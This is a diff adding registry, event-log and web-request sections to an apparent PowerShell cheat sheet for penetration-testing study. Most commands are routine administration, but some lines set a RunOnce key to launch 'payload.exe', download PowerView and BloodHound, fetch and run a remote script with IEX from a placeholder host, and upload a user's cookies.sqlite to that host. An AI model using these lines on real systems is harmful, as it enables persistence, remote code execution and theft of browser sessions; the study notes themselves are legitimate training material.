@@ -297,11 +297,40 @@ PS %> invoke-command -ComputerName <Computer01>,<Computer02> -ScriptBlock {Get-S
 ### Check which protection settings are enabled
 PS %> Get-MpComputerStatus
 ```
-**Reg Query**
+**Registry Query**
+- The Registry can be considered a hierarchal tree that contains two essential elements: **keys** and **values**.
+- MITRE provides many great examples of what a threat actor can do with access (locally or remotely) to a host's registry hive - [here](https://attack.mitre.org/techniques/T1112/)
+- A detailed list of all Registry Hives and their supporting files within the OS - [here](https://learn.microsoft.com/en-us/windows/win32/sysinfo/registry-hives)
+- The complete list of Registry Key Values - [here](https://learn.microsoft.com/en-us/windows/win32/sysinfo/registry-value-types)
+- The predefined keys for the Registry - [here](https://learn.microsoft.com/en-us/windows/win32/sysinfo/predefined-keys)
 ```
+### List Root Registry Keys
+PS %> Get-ChildItem C:\Windows\System32\config\
+
+### List the name of the services/applications currently running.
+PS %> Get-Item -Path Registry::HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Run | Select-Object -ExpandProperty Property  
+
+### New Registry Key
+PS %> New-Item -Path HKCU:\SOFTWARE\Microsoft\Windows\CurrentVersion\RunOnce\ -Name <New_Key_Name>
+
+### Example of Set New Registry Item Property
+PS %> New-ItemProperty -Path HKCU:\SOFTWARE\Microsoft\Windows\CurrentVersion\RunOnce\TestKey -Name  "access" -PropertyType String -Value "C:\Users\Zed\Downloads\payload.exe"
+
+### Delete Reg properties
+PS %> Remove-ItemProperty -Path HKCU:\SOFTWARE\Microsoft\Windows\CurrentVersion\RunOnce\TestKey -Name  "access"
+
+### Recursive Search
+PS %> Get-ChildItem -Path HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion -Recurse
+
+### Registry key is used to start services/applications when a user logs in to the host
+PS %> Get-ItemProperty -Path Registry::HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Run
+
 ### Use Run or RunOnce registry keys to make a program run when a user logs on:
 PS %> reg query HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Run
 PS %> reg query HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Run
+
+### Searching With Reg Query
+PS %>  REG QUERY HKCU /F "<Keyword>" /t REG_SZ /S /K
 ```
 **Execution Policy**
 
@@ -332,5 +361,48 @@ PS %> $env:PSModulePath
 
 ### Check what aliases, cmdlets, and functions an imported module brought to the session
 PS %> Get-Command -Module <Module_name>
+```
 
+**Working with the Windows Event Log**
+- The Windows Event Log is handled by the EventLog services. On a Windows system, the service's display name is Windows Event Log, and it runs inside the service host process svchost.exe. It is set to start automatically at system boot by default. It is difficult to stop the EventLog service as it has multiple dependency services. If it is stopped, it will likely cause significant system instability. 
+- Searchable database of Event IDs - [here](https://www.ultimatewindowssecurity.com/securitylog/encyclopedia/)
+- List of Event IDs that an organization can monitor to detect various issues - [here](https://learn.microsoft.com/en-us/windows-server/identity/ad-ds/plan/appendix-l--events-to-monitor)
+- Some examples for Get-WinEvent - [link_1](https://learn.microsoft.com/en-us/powershell/module/microsoft.powershell.diagnostics/get-winevent?view=powershell-7.3), [link_2](https://4sysops.com/archives/search-the-event-log-with-the-get-winevent-powershell-cmdlet/)
+```
+### Event Log location:
+PS %> ls C:\Windows\System32\winevt\logs
+
+### Listing All Logs
+PS %> Get-WinEvent -ListLog *
+
+### Security Log Details
+PS %> Get-WinEvent -ListLog Security
+
+### Querying Last Five Security Events
+PS %> Get-WinEvent -LogName 'Security' -MaxEvents 5 | Select-Object -ExpandProperty Message
+
+### Filtering for Logon Failures
+PS %> Get-WinEvent -FilterHashTable @{LogName='Security';ID='4625 '}
+
+### Check all System logs for only critical events with information level 1.
+PS %> Get-WinEvent -FilterHashTable @{LogName='System';Level='1'} | select-object -ExpandProperty Message
+```
+
+**Interacting With The Web**
+```
+### Get Request with Invoke-WebRequest
+PS %> Invoke-WebRequest -Uri "<URL>" -Method GET | Get-Member
+
+### Filtering Incoming Content
+PS C:\htb> Invoke-WebRequest -Uri "<URL>" -Method GET | fl Images
+
+### Downloading files
+PS %> Invoke-WebRequest -Uri "https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/Recon/PowerView.ps1" -OutFile "C:\PowerView.ps1"
+
+### Download files using .Net.WebClient
+PS %> (New-Object Net.WebClient).DownloadFile("https://github.com/BloodHoundAD/BloodHound/releases/download/4.2.0/BloodHound-win32-x64.zip", "Bloodhound.zip")
+PS %> IEX(New-Object Net.WebClient).DownloadString('http://[IP]:[Port]/PSUpload.ps1')
+
+### Upload files
+PS %> Invoke-FileUpload -Uri http://[IP]:[Port] -File C:\Users\Zed\Desktop\cookies.sqlite
 ```
